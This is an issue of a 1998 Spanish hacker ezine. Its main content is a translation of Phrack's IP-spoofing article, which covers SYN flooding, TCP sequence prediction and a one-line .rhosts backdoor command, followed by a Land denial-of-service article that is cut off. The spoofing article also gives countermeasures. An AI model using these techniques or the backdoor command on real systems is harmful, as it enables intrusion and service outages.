---
title: "jjf002"
ezine: "jjf"
---

# jjf002

**Ezine:** jjf

<div className="ascii-content">

```
                   
               
                        ╔────────────────────────────╗
                        │                  ┌──────┐  │
                        │                  │██████│  │
                        │           ┌──────┤██┌───┘  │
                        │    ┌──────┤██████│██└─┐    │
                        │    │██████├─┐██┌─┤████│    │
                        │    └─┐██┌─┴┐│██│J│██┌─┘    │
                        │  ┌──┐│██│██└┘██│J│██│      │  
                        │  │██└┘██│██████│F├──┘      │  
                        │  │██████├──────┴─┘         │  
                        │  └──────┘                  │  
                        │   H A C K E R S  T E A M   │  
                        │       J O U R N A L        │  
                        ╠────────────────────────────╣        
                        │     VOL. #1, Nº2, 1998.    │ 
                        ╚────────────────────────────╝


                             "HACK FROM DESIRE"


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=          

     Nota: - J.J.F. / HACKERS TEAM - no se hace responsable del mal uso
           de la informacion aqui expuesta y tampoco tiene que estar
           de acuerdo con lo que sus colaboradores opinen.
           Tampoco esperamos que la gente use la informacion aqui expuesta
           para hacer daño ya que tan solo es con fines didacticos.
 
     Recomendado el uso del editor del MS-DOS.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=          

     #CURRENT MEMBERS :

     - CONDE VAMPIRO     - CODER  H/P/V  EDITOR
     - MAC CRACK BISHOP  - CODER  C      WEBMASTER
     
     #WEB OFICIAL :

     - http://www.angelfire.com/mi/JJFHackers
     - http://jjfhackers.home.ml.org

     #E-MAIL OFICIAL :

     - jjf_team@hotmail.com

     #DISTRIBUIDORES OFICIALES DEL E-ZINE:

     - http://wakanda.islatortuga.com

     #COLABORADORES CON ESTE NUMERO :

     - IPgh0st (Underhack)
     - Virux (@pOkalypSYS)
     - Nobody
     - Bisho
     - Jsr

     #SALUDOS:

     - Metalslug (Wakanda)

<────────────────────────────────────────────────────────────────────────────>
<────────────────────────────────────────────────────────────────────────────>
<────────────────────────────────────────────────────────────────────────────>

  - INDICE.                                  

    TITULO                                        AUTOR
  ────────────\_______________________________/────────────

  * EDITORIAL ................................ J.J.F. / HACKERS TEAM
  * IP-SPOOFING DEMISTIFICADO ................ IPgh0st.
  * LAND ATTACK .............................. NOBODY.
  * CURSO DE HACK II ......................... CONDE VAMPIRO.
  * MOVIL DEFECTUOSO ERICSSON GA-628 ......... JSR.
  * INTRODUCCION AL HACK ..................... VIRUX.
  * HACKERS HALL OF FAME ..................... BISHO.
  * NOTICIAS UNDERGROUND ..................... J.J.F. / HACKERS TEAM

<────────────────────────────────────────────────────────────────────────────>
██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>

  -------------
  │ EDITORIAL │
  -------------

        Pues parece que el primer numero de nuestro e-zine a gustado
  bastante a la gente y esto nos alegra mucho y nos amina a seguir en este
  dificil mundo del hack. El e-zine fue colgado el primer fin de semana de
  diciembre (1997), viernes por la noche, y durante ese fin de semana
  recibimos mas de 100 visitas, en nuestra opinion todo un exito.

        Tambien deciros que hemos recibido criticas, algunas de mal gusto
  pero ya les hemos dado nuestra contestacion }:-). Si pensais que este
  e-zine es malo, os digo lo de siempre, en vez de tanto vacilar escribe
  algun articulo y veremos que sabes hacer y si no quieres escribir nada
  pues no lo leas y listos :-)

        Año nuevo revista nueva, como podeis ver tenemos varias novedades,
  en primer lugar destacar a Wakanda, grupo de la scene española que nos
  brindan su apoyo con el e-zine y se convierte en el distribuidor oficial
  del e-zine. Tambien hemos cambiado algunos aspectos de la revista para
  hacerla mas comoda y por supuesto intentamos mejorar la calidad de la misma.
  Deciros que cualquiera que quiera colocar el e-zine en su web o poner un
  link a nuestras paginas que nos envie un mail diciendonoslo, plz. Asi lo
  sacaremos en el e-zine. Por supuesto si alguna BBS quiere colaborar que nos
  escriba tambien.

        A los que estan atentos a nuestras novedades veran que - J.J.F. /
  HACKERS TEAM - tiene un nuevo dominio. Ademas deciros que aunque tengamos
  distruibuidores os aconsejo pasaros por nuestras web's oficiales ya que
  podras encontrar programas e informacion desarrollada en exclusiva por las
  industrias JJF. Y cada cierto tiempo iremos poniendo cosas nuevas.
  Logicamente el tiempo no nos sobra y no os podemos decir cada cuanto tiempo
  ponemos cosas nuevas o sacamos un nuevo numero del e-zine pero se procurar
  que sea el menor posible.

        Os quiero señalar, que parece que no ha quedado muy claro entre la
  gente la filosofia del e-zine, es solo un intento de crear algo interesante
  y util sobre H/C/P/V. Por eso podras encontrar articulos de alto nivel y
  otros articulos noveles para los principiantes, procurando que sea de
  interes a toda la scene. Los "ya Hackers" podran encontrar  articulos a su
  nivel y repasar los conceptos antiguos y los nuevos podran ir aprendindo el
  hacking y ademas tambien podran leer cosas tecnicas con las que entrar en
  la materia. En definitiva, es un e-zine escrito por Hackers para Hackers.

        Pues esto es todo por el momento y como siempre no dejare de
  repetirme, pero esperamos vuestros articulos sobre H/C/P/V y temas
  relacionados como (s.o., programacion, internet, etc...) para poder
  crear un e-zine de la calidad exigida por todos. Pues gracias por todo
  y espero que te diviertas con lo que hemos preparado en este numero.
  El mail para enviar vuestros articulos, criticas, sugerencias o cualquier
  cosas que nos quieras decir o si has hackeado un servidor o algo parecido
  envianos un mail y lo sacaremos en la seccion de noticias!! por supuesto
  la privacidad ante todo ;-), pues ya sabes escribe a:

  jjf_team@hotmail.com

                                                  - J.J.F. / HACKERS TEAM -

<────────────────────────────────────────────────────────────────────────────>
██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>

      ─────────────────────────────────────────────────────────────

                        IP-SPOOFING DEMISTIFICADO
                      por daemon9 / route / infinity
                            ==Phrack Magazine== 
                   Volumen 7, Numero 48, Archivo 14 de 18
                        Junio 1996 Guild Productions

                        Traducido por IPgh0st (1997)

      ─────────────────────────────────────────────────────────────

        El proposito de este documento es explicar el IP-spoofing a las masas.
  Solamente se requiere un poco de conocimiento practico de Unix y TCP/IP para
  entenderlo sin problemas. Oh, y que no seas un inutil...

        IP-spoofing es una compleja tecnica de ataque constituida por varias
  partes. (En la actualidad, IP-spoofing no es el ataque, sino solo un paso
  en el ataque. El ataque es actualmente un aprovechamiento de la relacion
  entre dos trusted hosts. Sin embargo, en este documento, IP-spoofing ira
  referido al ataque completo.) Explicara la tecnica en detalle, incluyendo
  informacion relevante sobre sistemas operativos y redes.

  [ SECCION I. INFORMACION PREVIA ]

  -- [ Los Protagonistas ]--

     A: host objetivo
     B: host con el que se establece la relacion ("trusted host")      
     X: host no alcanzable 
     Z: host atacante
     (1)2: host 1 disfrazado como host 2

  --[ Los Esquemas ]--

   Hay muchos esquemas en el documento y tienen que ser interpretados como el
   siguiente ejemplo:

     tick     host a      control       host b

      1          A      ---SYN--->       B

   tick: un paso de tiempo. No hay distincion entre *cuanto* tiempo pasa
         entre cada paso, simplemente que el tiempo pasa. Generalmente no es
         mucho.
   host a: Un sistema participando en una conversacion basada en TCP.
   control: Este campo muestra cualquier conjunto de bits de control
            relevantes en la cabecera  de TCP y la direccion que estan
            tomando los datos.
   host b: Un sistema prticipando en una conversacion basada en TCP. 

        En este caso, en el primer paso el host a le esta enviando un
  segmento TCP al host b con el bit de SYN  activado. A menos que se indique
  lo contrario, no nos importa la porcion de datos de dicho segmento TCP.

  --[ Trusted Hosts ]--
 
        En el mundo del Unix, la confianza se da facilmente. Digamos que
  tienes una cuenta en el sistema A, y otra en la maquina B.  Para facilitar
  ir de una a la otra con un minimo esfuerzo, deseas establecer una relacion
  o union entre ambas. En tu directorio home en A creas un archivo .rhosts:
  echo "B nombre-de-usuario" > ~/.rhosts. En tu directorio home en B creas
  otro archivo .rhosts: echo "A nombre-de-usuario" > ~/.rhosts. (Como
  alternativa, el root puede establecer una configuracion similar en
  /etc/hosts.equiv, la diferencia esta en que entonces seria a nivel del host
  entero, no solo a nivel individual.) Ahora, puedes usar cualquiera de los
  comandos r* sin necesidad de tener que perder el tiempo con verificaciones
  de passwords. Estos comandos permitiran la autentificacion en base a las
  direcciones, lo que ofrecera o negara el acceso dependiendo de la direccion
  IP del solicitante.
 
  --[ Rlogin ]--
 
        Rlogin es un simple protocolo cliente-servidor que utiliza TCP como
  medio de transporte. Rlogin permite a un usuario identificarse (hacer login)
  remotamente desde un host a otro, y, si el host objetivo confia en el otro
  (ver apartado anterior), no nos pedira ningun password. En lugar de esto
  habra comprobado la identidad del cliente (nosotros) analizando nuestra
  direccion IP. Por tanto, como en el ejemplo de arriba, podemos usar rlogin
  para hacer login remotamente desde A a B (o viceversa) y no nos pediran
  ningun password.

  --[ Internet Protocol (IP) ]--

        IP es el protocolo de red menos fiable de todo el sistema TCP/IP.
  Posee dos campos de encabezamiento de 32-bits para la informacion de las
  direcciones. IP es tambien el mas empleado de todos los protocolos TCP/IP
  ya que casi todo el trafico TCP/IP esta encapsulado en datagramas IP. El
  trabajo del IP es enrutar paquetes de la red. No ofrece ningun mecanismo de
  comprobacion (es un protocolo "sin conexion"). IP simplemente envia
  datagramas y confia que lleguen intactos a su destino. Si no lo hacen, IP
  puede intentar enviar un mensaje ICMP de error al origen, aunque por
  supuesto este paquete tambien puede extraviarse. (ICMP significa Internet
  Control Message Protocol, y se usa para informar sobre las condiciones en
  las que se encuentra una red y sobre los errores que se van produciendo al
  IP y a otros protocolos). IP no tiene ningun medio para garantizar el envio
  de paquetes.  No mantiene ninguna informacion sobre el estado de la
  conexion. Cada datagrama IP es enviado sin niguna relacion con el ultimo
  enviado o el siguiente a mandar. Esto, unido al hecho de que es sencillisimo
  modificar la pila de IP para permitir la eleccion de una direccion IP
  arbitrariamente en los campos de origen (y de destino) convierten al
  protocolo IP en algo facilmente modificable.

  --[ Transmission Control Protocol ]--

        TCP es el protocolo orientado a la conexion, el protocolo de
  transporte en el que se puede confiar plenamente dentro del sistema TCP/IP.
  Orientado-a-la-conexion significa simplemente que los dos hosts que
  participan en una discusion deben establecer previamente una conexion antes
  de que los datos puedan liarse a tortas. La seguridad se consigue a traves
  de diferentes modos, pero los dos que nos conciernen ahora mismo son
  secuenciacion de datos e identificacion. TCP asigna numeros secuenciales a
  cada segmento e identifica todos los segmentos de datos recibidos desde el
  otro extremo. (Se revisa la secuencia de numeros, no los segmentos en si).
  Estas caracteristicas hacen que TCP sea mucho mas dificil de trucar que IP.

  --[ Numeros Secuenciales, Identificaciones y otras indicaciones ]--

        Dado que TCP posee una seguridad bastante aceptable, debe ser capaz
  de recuperar datos perdidos, duplicados, o fuera de servicio. Asignando una
  secuencia de numeros a cada byte transmitido, y requiriendo una
  identificacion para cada uno recibido del extremo opuesto, TCP puede
  garantizar una transmision sin errores. El extremo receptor utiliza la
  secuencia de numeros para asegurar el orden correcto de los datos y
  eliminar bytes duplicados.
        Los numeros secuenciales del TCP se pueden imaginar como contadores
  de 32-bits. Se encuentran en un rango desde el 0 hasta el 4.294.967.295.
  Cada byte de datos intercambiado en una conexion TCP (junto a otros
  indicadores) va secuenciado. El campo del numero secuencial en la cabecera
  TCP contendra el numero secuencial correspondiente al *primer* byte de
  datos en el segmento TCP. El campo del numero de identificacion (ACK) en la
  cabecera TCP muestra el valor del siguiente numero secuencial *esperado*, y
  tambien identifica *todos* los datos hasta este numero de ACK menos uno.

        Para el control del flujo, TCP envia un paquete para decirle al otro
  extremo cuantos datos puede buffear. Dado que este paquete es de 16 bits,
  se puede notificar un maximo de 65535 bytes. El objetivo de este metodo es
  enviar una notificacion desde un TCP al otro sobre la amplitud de la
  secuencia de numeros a emplear de manera que sea aceptable.

        Otros indicadores en la cabecera TCP a mencionar son RST (reset), PSH
  (push) and FIN (finish). Si se recibe un RST, se corta inmediatamente la
  comunicacion. Los RSTs se envian normalmente cuando un extremo recibe un
  segmento que simplemente no tiene relacion con la conexion que esta
  establecida (veremos un ejemplo abajo). El indicador PSH le dice al
  receptor que pase tan pronto como sea posible todos los datos que se han
  ido almacenando a la aplicacion correspondiente. El indicador FIN es la
  manera en que una aplicacion comienza el amable cierre de la conexion (el
  corte de una conexion es un proceso de 4 direcciones).  Cuando un extremo
  recibe un FIN, lo ACKea (autentifica) y ya no espera recibir mas datos (sin
  embargo el envio es todavia posible).

  --[ Estableciendo una Conexion TCP ]--

        Para poder intercambiar datos usando TCP, los hosts deben establecer
  una conexion. TCP establece una conexion siguiendo un proceso de 3 pasos
  llamado el Saludo de las 3 direcciones. Si la maquina A esta utilizando un
  cliente de rlogin y desea conectar a un daemon de rlogin en la maquina B,
  el proceso es el siguiente:

        fig(1)

   1          A     ---SYN--->       B

   2          A     <---SYN/ACK---   B

   3          A     ---ACK--->       B


        En (1) el programa cliente le esta diciendo al servidor que quiere
  una conexion. Este es el unico proposito del indicador SYN. El cliente le
  esta diciendo al server que el campo de secuencia numerica es valido, y que
  deberia ser comprobado. El cliente configurara el campo de secuencia
  numerica en la cabecera TCP a su ISN (Initial Sequence Number, numero
  inicial de la secuencia). El server, al recibir este segmento (2)
  respondera con su propio ISN (por lo tanto el flag SYN esta activado) y una
  autentificacion (ACK) del primer segmento enviado por el cliente (que sera
  el ISN del cliente + 1). El cliente entonces ACKea (autentifica) el ISN del
  servidor (3). Ahora ya puede tener lugar la transferencia de datos.

  --[ El ISN y el Incremento de los  Numeros Secuenciales ]--

        Es importante entender como son elegidos los numeros secuenciales
  inicialmente, y como cambian con respecto al tiempo. El numero secuencial
  inicial se cambia a 1 cuando el host se inicializa. (TCP llama a esta
  variable "tcp_iss" dado que se trata del numero secuencial inicial *de
  envio* (initial*send* sequence number). La otra variable de numero
  secuencial, "tcp_irs" es el numero secuencial inicial *de recepcion*
  (initial *receive* sequence number) y se establece al crearse la conexion
  de 3 direcciones que tratamos antes. Pero no nos vamos a preocupar por las
  distinciones entre las dos variables). Esto da a entender un error, y se
  autentifica como tal con el correspondiente comentario en la funcion
  tcp_init() de donde aparece.  El ISN se incrementa en 128.000 cada segundo,
  lo que provoca que el contador de ISN de 32-bits quede agotado cada 9.32
  horas si no se establece ninguna conexion. Sin embargo, cada vez que se
  establece un connect(), el contador es incrementado en 64.000.

        Esto es asi por una importante razon, y es hacer minimo el riesgo de
  que datos de una vieja encarnacion pasada (jeje, quiero decir, desde el
  mismo cuarteto de direcciones-IP y puertos TCP locales y remotos) de la
  conexion actual pueda llegar y joder las cosas. Aqui se aplica el concepto
  del tiempo de espera de 2MSL, pero no lo analizaremos porque no es el
  objetivo de este documento. Si los numeros secuenciales fuesen elegidos al
  azar cuando llega una conexion, no se podria garantizar que esos numeros
  secuenciales fuesen distintos de los empleados en una conexion anterior. Si
  una porcion de datos quedase retenida en mitad de su recorrido y despues
  consiguiese llegar a su destino interfiriendo con el reenvio de la vieja
  conexion, ten por seguro que se joderan las cosas.

  --[ Puertos ]--

        Para garantizar el acceso simultaneo al modulo de TCP, TCP provee un
  interfaz de usuario llamado puerto. Los puertos son utilizados por el
  kernel para identificar procesos de red. Y estos son estrictamente
  entidades de transporte (que es lo mismo que decir que al IP le importa un
  pimiento su presencia). Junto a una direccion IP, un puerto TCP forma lo que
  hemos llamado extremo de una comunicacion de red. De hecho, en un momento
  dado *cualquier* conexion de Internet puede ser descrita por 4 numeros: la
  direccion IP de inicio y su puerto , y la direccion IP de destino y el
  correspondiente puerto de destino. Los servers suelen ceñirse a puertos
  corrientes para que puedan ser localizados a traves de puertos estandar en
  sistemas diferentes. Por ejemplo, el daemon de rlogin se encuentra en el
  puerto TCP 513.

  [ SECCION II.  EL ATAQUE ]

        ...El diablo encuentra trabajo para las manos que no hacen nada...

  --[ Antes de nada... ]--

        El IP-spoofing se compone de varios pasos, que resumire brevemente
  ahora y luego analizaremos con mas profundidad. Primero, se elige el host
  objetivo. A continuacion descubrimos un indicio de "confianza" con otro
  host, es decir, nos lleva a un trusted host. Entonces se desactiva el
  trusted-host, y se hace un muestreo de  los numeros secuenciales de TCP del
  objetivo. Se usurpa la personalidad del trusted host, se averiguan los
  numeros secuenciales correspondientes, y se intenta la conexion a un
  servicio que solo requiera identificacion basada en direcciones. Si sale
  bien, el atacante ejecuta un simple comando para dejar una puerta trasera
  en el sistema.

  --[ Cosas Necesarias ]--

        Hay varias cosas que se necesitan para llevar a cabo esta tecnica:

    - cerebro, mente, o cualquier otro dispositivo pensante
    - host objetivo
    - trusted host 
    - host atacante (con acceso de root)
    - software de IP-spoofing 

        Generalmente el ataque se hace desde la cuenta root del host atacante
  contra la cuenta de root del objetivo. Si el atacante se va a tomar todas
  estas molestias, seria estupido no aspirar como minimo a ser root. (Dado
  que se necesita ser root para ejecutar el ataque, esto no deberia ser
  problema).

  --[ IP-Spoofing es un "Ataque Ciego" ]--
 
        Un factor que muchas veces no se analiza pero que es critico en el
  IP-spoofing es el hecho de que el ataque es ciego. El atacante va a estar
  suplantando la identidad de un trusted-host para poder saltarse la
  seguridad del host objetivo. El trusted-host se desactiva empleando el
  metodo explicado abajo. Lo que el host objetivo cree es que esta
  manteniendo una conversacion con otro colega. En realidad, el atacante
  esta sentado en alguna oscura esquina de Internet, falsificando paquetes
  desde este trusted-host mientras esta enfrascado en una batalla de DoS
  (denial of service). Los datagramas IP enviados con la direccion IP
  falsificada alcanzan su objetivo sin problemas (recordemos que IP es un
  protocolo "sin conexion" , cada datagrama es enviado sin tener en cuenta
  lo que pase con el otro extremo) pero los datagramas que el host objetivo
  env·} de vuelta (destinados al trusted-host)  se van a la mierda. El
  atacante nunca los ve. Los routers que intervienen conocen donde se
  supone que tienen que ir los datagramas. Se supone que van hacia el
  trusted-host. En lo que respecta al nivel de red, desde aqui es desde
  donde fueron originados y ahi es donde deberian ir las contestaciones. Por
  supuesto una vez que los datagramas son enrutados hacia alli y la
  informacion es desmultiplexada y llega al TCP, se desecha (el TCP del
  trusted-host no puede responder --ver abajo). Por lo tanto el atacante
  tiene que ser inteligente y *saber* que fue enviado, y *saber* que
  respuesta esta buscando el server.  El atacante no puede ver lo que el host
  objetivo le envia, pero puede *predecir* lo que le enviara; eso unido al
  conocimiento con certeza de lo que *enviara*, le permite al atacante
  librarse de esta "ceguera".

  --[ Encontrando Trusted-Hosts ]--

        Despues de elegir un objetivo el atacante debe averiguar los posibles
  trusted-hosts disponibles (por el bien de todo esto, daremos por hecho que
  el host objetivo *SI* confia en alguien. Si no es asi, el ataque se
  acabaria aqui). Averiguar en quien confia un host puede no ser facil. Un
  "showmount -e" puede mostrarte a donde se exportan los archivos del sistema,
  y rcpinfo tambien puede ofrecerte informacion interesante. Si se tiene
  abundante informacion sobre el host, no deberia ser dificil.  Si todo esto
  falla, probar direcciones IP vecinas en un esfuerzo de fuerza bruta puede
  ser una opcion viable.

  --[ Desactivacion del Trusted-Host Empleando Synflooding ]--

        Una vez que hemos encontrado el trusted-host, debemos desactivarlo.
  Dado que el atacante va a hacerse pasar por el, debe asegurarse de que este
  host no reciba ningun trafico de la red y nos fastidie las cosas.  Existen
  muchas maneras para hacer esto, la que voy a explicar es el TCP SYN
  flooding.

        Una conexion TCP se inicia cuando un cliente hace una peticion a un
  server con el SYN flag activado en la cabecera TCP. Normalmente el server
  devolvera un SYN/ACK al cliente identificado por la direccion de 32-bits en
  la cabecera IP. El cliente enviara entonces un ACK al server (como veiamos
  en la figura 1 al principio)  y la transferencia de datos podra comenzar. Sin
  embargo, existe un limite maximo de las peticiones de SYN concurrentes que
  TCP puede procesar para una determinada conexion. Este limite se denomina
  "backlog" y es la longitud de la cola donde se almacenan las conexiones
  entrantes (por tanto todavia incompletas). Este limite de la cola tiene en
  cuenta el numero de conexiones incompletas (el saludo de 3 direcciones esta
  incompleto) y el numero de conexiones completadas que han sido sacadas de la
  cola por la aplicacion correspondiente por medio del sistema de llamada
  accept(). Si este limite "backlog" se alcanza, TCP desechara en silencio
  todas las peticiones de SYN hasta que las conexiones pendientes puedan ser
  resueltas. Este es el quid de la cuestion.

        El host atacante envia varias peticiones de SYN al puerto TCP que se
  desea desactivar. Este host tambien debe asegurarse de que la direccion-IP
  del origen sea cambiada por otra, en este caso un host inalcanzable (el TCP
  del host objetivo enviara su respuesta a esta direccion. (IP puede informar
  al TCP de que el host no es alcanzable, pero TCP considera que estos
  errores son temporales y deja la resolucion de ellos al IP (reenrutar los
  paquetes, etc.) , quien en efecto los ignora). La direccion-IP debe ser
  inalcanzable porque el atacante no desea que ningun host reciba los
  SYN/ACKs que llegaran enviados por el TCP del host objetivo (si lo anterior
  sucediese, daria como resultado un RST que se enviaria al TCP del host
  objetivo, lo que anularia nuestro ataque). El proceso es asi:

                fig(2)

    1       Z(x)    ---SYN--->      B

            Z(x)    ---SYN--->      B

            Z(x)    ---SYN--->      B

            Z(x)    ---SYN--->      B

            Z(x)    ---SYN--->      B
        
                ...

    2       X    <---SYN/ACK---     B

            X    <---SYN/ACK---     B

                ...

    3       X      <---RST---       B


        En (1) el host atacante envia un gran numero de peticiones  SYN al
  objetivo (recuerda que el objetivo en esta fase del ataque es el
  "trusted-host") para llenar su cola de backlog con conexiones pendientes.

        (2) El host objetivo responde con SYN/ACKs a lo que el cree es el
  origen de los SYNs que le llegan.  Durante todo esto todas otras peticiones
  a este puerto TCP seran ignoradas.

        Diferentes implementaciones de TCP poseen tamaños de backlog
  distintos. BSD generalmente tiene un backlog de 5 (Linux tiene un backlog
  de 6). Pero ademas existe un gracioso margen de 3/2. Esto es, TCP permitira
  un numero de conexiones de hasta backlog*3/2+1. Esto hara posible una
  conexion incluso si el backlog señala 0.

        Nota del Autor:[ Para un analisis mas exhaustivo del TCP SYN flooding,
  leer mi trabajo sobre este tema. Cubre el proceso completo al detalle, con
  teoria y practica. Esta acompañado de codigo para su funcionamiento, un
  analisis estadastico y mas. Buscalo en el numero 49 de Phrack.
  -daemon9 6/96. ]

  --[ Muestreo de los Numeros Secuenciales y Prediccion ]--

        Ahora el atacante necesita hacerse una idea de donde se encuentra el
  TCP del host objetivo de entre el espacio de la secuencia numerica de
  32-bits. El atacante conecta a un puerto TCP del host objetivo (SMTP es una
  buena eleccion) justo antes de lanzar el ataque y completa el "saludo" de 3
  direcciones con dicho host. El proceso es exactamente como en la fig(1),
  excepto que el atacante guardara el valor del ISN enviado por el host
  objetivo. Muchas veces, este proceso se repite varias veces y el ultimo ISN
  enviado se almacena. El atacante necesita saber cual es el RTT
  (round-trip time, tiempo de ida/vuelta) desde el objetivo a su host. (El
  proceso puede repetirse varias veces, y se calcula una media de todos los
  RTTs hallados). El RTT es necesario para poder predecir con seguridad el
  siguiente ISN. El atacante tiene un punto de referencia (el ultimo ISN
  enviado) y conoce tambien como funciona el incremento de los numeros
  secuenciales (128.000/segundo y 64.000 por cada connect) y ahora tiene una
  idea bastante aproximada de cuanto tardara un datagrama IP en viajar por
  Internet hasta alcanzar al objetivo (aproximadamente la mitad del RTT, dado
  que la mayoria de las veces las rutas son simetricas). Despues de que el
  atacante haya conseguido esta informacion, inmediatamente se procede a la
  siguiente fase del ataque (si otra conexion TCP llegase a algun puerto del
  objetivo antes de que el atacante haya podido continuar con el ataque, el
  ISN real tendria una diferencia de 64.000 con el ISN previsto).

        Cuando el segmento spoofeado recorre su camino hasta el objetivo,
  pueden pasar varias cosas dependiendo de la exactitud de la prediccion del
  atacante:

  - Si el numero secuencial esta EXACTAMENTE donde el TCP receptor espera que
    este, los datos que llegan seran colocados en la siguiente posicion
    disponible del buffer receptor.
  - Si el numero secuencial es MENOR que el valor esperado el byte de datos
    se considera como una repeticion de la transmision, y es desechado.
  - Si el numero secuencial es MAYOR que el valor esperado pero todavia
    dentro de los limites de la capacidad del buffer, el byte de datos se
    considera que es un byte futuro, y es controlado por el TCP, pendiente de
    la llegada de los bytes que faltan antes que el. Si llega un segmento con
    un numero secuencial MAYOR que el valor esperado y que NO esta dentro de
    los limites de la capacidad del buffer el segmento es excluido, y TCP
    enviara un segmento de respuesta con el numero secuencial *esperado*.

  --[ Alteracion... ]--

        Aqui es donde empieza la parte mas emocionante del ataque:

                fig(3)
     
     1       Z(b)    ---SYN--->      A

     2       B     <---SYN/ACK---    A

     3       Z(b)    ---ACK--->      A

     4       Z(b)    ---PSH--->      A

                 [...]

        El host atacante spoofea su direccion-IP para que sea la del
  "trusted-host" (el cual todavia deber·} estar sufriendo los efectos del
  ataque de D.O.S , denial of service) y envia su peticion de conexion al
  puerto 513 del host objetivo (1). En (2), el host objetivo responde a la
  peticion de conexion spoofeada con un SYN/ACK, que recorrera su camino
  hasta el trusted-host (el cual, si *pudiera* procesar este segmento
  entrante, lo consideraria un error, e inmediatamente envia un RST al host
  objetivo). Si todo va de acuerdo con lo previsto, el SYN/ACK sera ignorado
  por el trusted host. Despues de (1), el atacante puede descansar un poco
  para darle tiempo al host objetivo para enviar el SYN/ACK (el atacante no
  puede ver este segmento). Entonces, en (3) el atacante envia un ACK al host
  objetivo conteniendo el numero secuencial previsto (mas uno, porque estamos
  ACKeandolo). Si el atacante acierta en su prediccion, el host objetivo
  aceptara el ACK. El host objetivo establece la conexion y la transferencia
  de datos puede comenzar (4).

        Generalmente, despues de establecer la conexion , el atacante
  insertara una backdoor en el sistema que le permitira llevar a cabo nuevas
  intrusiones de una manera mas facil. (Con un `cat + + >> ~/.rhosts) suele
  bastar. Esta es una buena idea por varias razones: es rapido, permite
  accesos mas simples, y no es interactivo. Recuerda, el atacante no puede
  ver el trafico que proviene del host objetivo, por lo tanto todas las
  respuestas caeran en el olvido).

  --[ Por Que Funciona ]--

        El IP-Spoofing funciona porque los servicios de trust entre
  ordenadores (como los "trusted-hosts") solamente basan su seguridad en
  autentificaciones de las direcciones de red. Dado que el IP es facilmente
  engañable, la falsificacion de direcciones no es dificil. La parte mas
  complicada del ataque es la prediccion de los numeros secuenciales, porque
  es ahi donde las suposiciones y conjeturas entran en escena. Reducir las
  dudas y las adivinanzas al minimo es basico para tener mas posibilidades de
  exito. Incluso un sistema que utilice los TCP wrappers de Wietse Venema es
  vulnerable al ataque. Los TCP wrappers se basan en los hostnames o en
  direcciones-IP para las autentificaciones de los usuarios...

  [ SECCION III. MEDIDAS PREVENTIVAS ]

        ...Mas vale prevenir que curar...
 
  --[ No Confiar en Nadie ]--

        Una sencilla solucion para prevenir este ataque es no utilizar la
  autentificacion basada en direcciones. Desactivar los comandos r*, borrar
  todos los archivos .rhosts y vaciar el archivo /etc/hosts.equiv. Esto
  forzara a todos los usuarios a emplear otras medidas de acceso remoto
  (telnet, ssh, skey, etc.)

  --[ Filtrado de Paquetes ]--

        Si tu host tiene una conexion directa a Internet, puedes utilizar tu
  router para ayudarte. Primero asegurate de que unicamente hosts de tu
  propia LAN interna pueden participar en relaciones de trust (ningun host
  interno debe ser  trusted-host de otro sistema externo a la LAN, o
  viceversa). Entonces simplemente filtra *todo* el trafico desde fuera
  (desde Internet) que desea llegar hasta el interior (a tu LAN).

  --[ Metodos Criptograficos ]--

        UN metodo obvio para evitar el IP-spoofing es obligar a que todo el
  trafico de la red sea encriptado y/o autentificado. Mientras se debaten
  otras posibles soluciones, puede establecerse esta como medida estandar de
  seguridad.

  --[ Numero Secuencial Inicial Aleatorio ]--
 
        Dado que los numeros secuenciales no son escogidos aleatoriamente (o
  incrementados aleatoriamente) el ataque funciona. Bellovin aporta un parche
  para TCP que implica una particion del espacio dedicado al numero
  secuencial. Cada conexion tendria su propio espacio separado de numero
  secuencial. Los numeros secuenciales serian incrementados como antes, sin 
  embargo, no habria ninguna relacion obvia o apreciable entre la numeracion
  en estos espacios. Se sugiere la formula siguiente:

     ISN=M+F(localhost,localport,remotehost,remoteport)

        Donde M es el cronometro de 4 microsegundos y F es un hash
  criptografico. F no debe ser calculable desde el exterior o el atacante
  podria todavia averiguar la secuencia numerica. Bellovin sugiere que F sea
  un hash de el id de la conexion y un vector secreto (un numero aleatorio, o
  un numero de host secreto relacionado combinado con el tiempo que lleva
  encendida la maquina).

  [ SECCION IV.  RECURSOS ]

        - Libros: TCP/IP Ilustrado, vols. I, II & III
        - RFCs: 793, 1825, 1948
        - Gente: Richard W. Stevens, y los usuarios de Information Nexus.
        - Codigo disponible: rbone, mendax, SYNflood

        Este documento fue posible gracias a una beca de Guild Corporation.

  TRADUCIDO POR IPgh0st
  UNDERHACK 
  http://underhack.islatortuga.com
  http://www.geocities.com/SiliconValley/Park/7479

<────────────────────────────────────────────────────────────────────────────>
██████████████████████████████████████████████████████████████████████████████
<────────────────────────────────────────────────────────────────────────────>
                                                                    9-12-1997.
                                                                      ??????
                            ┌───────────────┐
                               LAND ATTACK 

                                by NOBODY 
                            └───────────────┘

        Nota del Autor: Ni yo ni el grupo - J.J.F. / HACKERS TEAM - nos
   responsabilizamos del mal uso de la informacion aqui expuesta. Con esto
   solo os quiero advertir del daño que podeis ocasionar, del cual no sere
   responsable.

        Pues aqui os describire un ataque al tipico s.o. de siempre :),
   por supuesto el ventanas, win95. Este ataque es una variante del famoso
   "denial of service attack", tambien conocido como DoS, si no conoces esta
   tecnica y sabes ingles te remito a mirrarte el magnifico trabajo de
   Hans Husman llamado "Introduction to Denial of Service". Disponible en:

        http://www.student.tdb.uu.se/~t95hhu/secure/DENIAL.txt
     
        El DoS es una tecnica por la cual un individuo sin permiso ataca un
  servicio, lo mas comun es tirar un sistema entero. Este tipo de ataques
  son muy faciles de ejecutar y por el contrario son bastantes dificiles de
  proteger. El problema radica en que unix asume que un usuario del sistema
  o de otro sistemas haran buen uso de el.

        El Land attack, basicamente consiste en spoofear un paquete con el
  bit SYN activado desde un host, hacia un puerto abierto ( por ejemplo el
  113 o el 139), poniendo de origen el mismo host y puerto, se lo enviamos
  a la victima y la maquina caera o se colgara.

        Ejemplo:  10.0.0.1:139 to 10.0.0.1:139

        Logicamente esto hara que el win95 se caiga :). Este ataque fue
